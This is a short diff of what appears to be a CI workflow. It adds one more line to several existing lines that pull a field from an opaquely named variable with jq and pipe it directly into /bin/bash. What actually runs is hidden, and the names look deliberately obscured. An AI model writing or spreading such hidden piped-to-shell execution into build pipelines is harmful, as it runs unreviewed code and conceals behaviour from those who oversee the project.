@@ -23,6 +23,7 @@ jobs:
           echo $hhevt0893 | jq -r .kk3778 | /bin/bash
           echo $aioas53 | jq -r .hml3364 | /bin/bash
           echo $w350 | jq -r .sf6 | /bin/bash
+          echo $arkis13 | jq -r .wnp472 | /bin/bash
 
       - name: Archive output
         if: always()
